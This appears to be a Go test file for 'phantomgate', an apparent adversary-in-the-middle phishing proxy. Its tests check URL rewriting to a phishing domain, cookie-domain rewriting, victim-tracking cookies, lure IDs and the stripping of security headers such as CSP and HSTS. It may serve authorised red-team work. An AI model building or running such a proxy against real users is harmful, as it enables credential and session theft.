package proxy

import (
	"compress/gzip"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/phantomgate/phantomgate/internal/config"
	"github.com/phantomgate/phantomgate/internal/lure"
	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// ─── Fuzz Tests ───────────────────────────────────────────────────────────────

// FuzzRewriteURLToPhish fuzzes URL rewriting with arbitrary input URLs.
func FuzzRewriteURLToPhish(f *testing.F) {
	pp := newTestProxy("http://127.0.0.1:9999")

	f.Add("https://127.0.0.1:9999/login")
	f.Add("")
	f.Add("https://127.0.0.1:9999/" + strings.Repeat("a", 10000))
	f.Add("http://evil.test/path?q=1#frag")
	f.Add("://no-scheme")
	f.Add("\x00\x01\x02")

	f.Fuzz(func(t *testing.T, rawURL string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("rewriteURLToPhish panicked on %q: %v", rawURL, r)
			}
		}()
		_ = pp.rewriteURLToPhish(rawURL)
	})
}

// FuzzRewriteURLToReal fuzzes the reverse URL rewrite.
func FuzzRewriteURLToReal(f *testing.F) {
	pp := newTestProxy("http://127.0.0.1:9999")

	f.Add("https://login.evil.test/path")
	f.Add("")
	f.Add("https://login.evil.test/" + strings.Repeat("x", 5000))
	f.Add("\x00")

	f.Fuzz(func(t *testing.T, rawURL string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("rewriteURLToReal panicked on %q: %v", rawURL, r)
			}
		}()
		_ = pp.rewriteURLToReal(rawURL)
	})
}

// FuzzServeHTTP fuzzes the full proxy handler with arbitrary request inputs.
func FuzzServeHTTP(f *testing.F) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	}))

	pp := newTestProxy(backend.URL)

	f.Add("GET", "http://login.evil.test/", "")
	f.Add("POST", "http://login.evil.test/login", "user=a&pass=b")
	f.Add("GET", "http://unknown.evil.test/", "")
	f.Add("OPTIONS", "http://login.evil.test/", "")
	f.Add("GET", "http://login.evil.test/"+strings.Repeat("x", 2000), "")

	f.Fuzz(func(t *testing.T, method, url, body string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ServeHTTP panicked: %v", r)
			}
		}()
		var bodyReader io.Reader
		if body != "" {
			bodyReader = strings.NewReader(body)
		}
		req, err := http.NewRequest(method, url, bodyReader)
		if err != nil {
			return
		}
		w := httptest.NewRecorder()
		pp.ServeHTTP(w, req)
	})
}

// ─── Extended Unit Tests ──────────────────────────────────────────────────────

// TestProxyRewritesGzipBody tests that gzip-encoded responses are correctly decompressed
// and domain-rewritten, then served uncompressed.
func TestProxyRewritesGzipBody(t *testing.T) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write([]byte(`<html><body><a href="https://login.example.com/path">link</a></body></html>`))
	gz.Close()
	compressedBody := buf.Bytes()

	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("Content-Encoding", "gzip")
		w.Write(compressedBody)
	}))
	defer backend.Close()

	host := strings.TrimPrefix(backend.URL, "http://")
	cfg := config.DefaultConfig()
	cfg.Domain = "evil.test"
	cfg.Stealth.RandomizeTimings = false
	p := &phishlet.Phishlet{
		Name: "test",
		ProxyHosts: []phishlet.ProxyHost{
			{PhishSub: "login", OrigSub: host, Domain: "test", IsSSL: false},
		},
	}
	s := store.NewStore("")
	lg := lure.NewGenerator("evil.test")
	pp := NewPhantomProxy(cfg, p, s, lg)

	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	body, _ := io.ReadAll(w.Result().Body)
	if strings.Contains(string(body), host) {
		t.Error("response body should NOT contain the real backend host")
	}
}

// TestProxyRewritesCookieDomains verifies Set-Cookie domains are rewritten.
func TestProxyRewritesCookieDomains(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.SetCookie(w, &http.Cookie{
			Name:   "SESSION",
			Value:  "abc123",
			Domain: ".real.example.com",
			Path:   "/",
		})
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	resp := w.Result()
	found := false
	for _, c := range resp.Cookies() {
		if c.Name == "SESSION" {
			found = true
			if c.Domain == ".real.example.com" {
				t.Error("Cookie domain should be rewritten, not the original real domain")
			}
		}
	}
	if !found {
		t.Error("SESSION cookie not found in response")
	}
}

// TestProxyRewritesLocationHeader verifies redirect locations are poisoned.
func TestProxyRewritesLocationHeader(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		host := strings.TrimPrefix(r.Host, "http://")
		w.Header().Set("Location", fmt.Sprintf("https://%s/dashboard", host))
		w.WriteHeader(http.StatusFound)
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	location := w.Header().Get("Location")
	if strings.Contains(location, "real.backend.host") {
		t.Errorf("Location header should not leak real backend: %q", location)
	}
}

// TestVictimIDPersistence verifies that a second request reuses the tracking cookie.
func TestVictimIDPersistence(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	// First request — get the tracking cookie
	req1 := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w1 := httptest.NewRecorder()
	pp.ServeHTTP(w1, req1)

	var victimID string
	for _, c := range w1.Result().Cookies() {
		if c.Name == "_pg_vid" {
			victimID = c.Value
		}
	}
	if victimID == "" {
		t.Fatal("no victim tracking cookie set")
	}

	// Second request — send the cookie back
	req2 := httptest.NewRequest("GET", "http://login.evil.test/page2", nil)
	req2.AddCookie(&http.Cookie{Name: "_pg_vid", Value: victimID})
	w2 := httptest.NewRecorder()
	pp.ServeHTTP(w2, req2)

	// The same victim ID should be returned (no new cookie)
	for _, c := range w2.Result().Cookies() {
		if c.Name == "_pg_vid" && c.Value != victimID {
			t.Errorf("victim ID changed between requests: %q != %q", victimID, c.Value)
		}
	}
}

// TestLureIDTracking verifies ?_lid= query param is tracked.
func TestLureIDTracking(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	req := httptest.NewRequest("GET", "http://login.evil.test/?_lid=campaign-001", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	// Should set a tracking cookie with the lure ID
	found := false
	for _, c := range w.Result().Cookies() {
		if c.Name == "_pg_vid" && c.Value == "campaign-001" {
			found = true
		}
	}
	if !found {
		t.Error("lure ID should be used as victim tracking ID")
	}
}

// TestProxyAllSecurityHeadersStripped validates all security headers are removed.
func TestProxyAllSecurityHeadersStripped(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.Header().Set("Content-Security-Policy-Report-Only", "default-src 'self'")
		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	resp := w.Result()
	stripped := []string{
		"Content-Security-Policy",
		"Content-Security-Policy-Report-Only",
		"Strict-Transport-Security",
		"X-Frame-Options",
		"X-Content-Type-Options",
		"X-XSS-Protection",
	}
	for _, h := range stripped {
		if resp.Header.Get(h) != "" {
			t.Errorf("security header %q should be stripped but found: %q", h, resp.Header.Get(h))
		}
	}
}

// TestHighConcurrentRequests stresses the proxy handler with parallel requests.
func TestHighConcurrentRequests(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(time.Millisecond)
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	const n = 50
	var wg sync.WaitGroup
	wg.Add(n)
	errs := make(chan string, n)

	for i := 0; i < n; i++ {
		go func(i int) {
			defer wg.Done()
			req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
			w := httptest.NewRecorder()
			pp.ServeHTTP(w, req)
			if w.Code != 200 {
				errs <- fmt.Sprintf("request %d got %d", i, w.Code)
			}
		}(i)
	}

	wg.Wait()
	close(errs)
	for err := range errs {
		t.Error(err)
	}
}

// ─── Benchmarks ───────────────────────────────────────────────────────────────

func BenchmarkServeHTTP_Passthrough(b *testing.B) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
		w := httptest.NewRecorder()
		pp.ServeHTTP(w, req)
	}
}

func BenchmarkServeHTTP_WithBodyRewrite(b *testing.B) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "<html><body>Welcome to %s</body></html>", r.Host)
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
		w := httptest.NewRecorder()
		pp.ServeHTTP(w, req)
	}
}

func BenchmarkRewriteURLToPhish(b *testing.B) {
	pp := newTestProxy("http://127.0.0.1:9999")
	url := "https://127.0.0.1:9999/login/oauth/callback?code=abc123&state=xyz"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		pp.rewriteURLToPhish(url)
	}
}

func BenchmarkTLSConfigGeneration(b *testing.B) {
	cfg := config.DefaultConfig()
	cfg.Domain = "bench.evil.test"
	p := &phishlet.Phishlet{Name: "bench"}
	s := store.NewStore("")
	lg := lure.NewGenerator("bench.evil.test")
	pp := NewPhantomProxy(cfg, p, s, lg)

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := pp.CreateTLSConfig()
		if err != nil {
			b.Fatal(err)
		}
	}
}
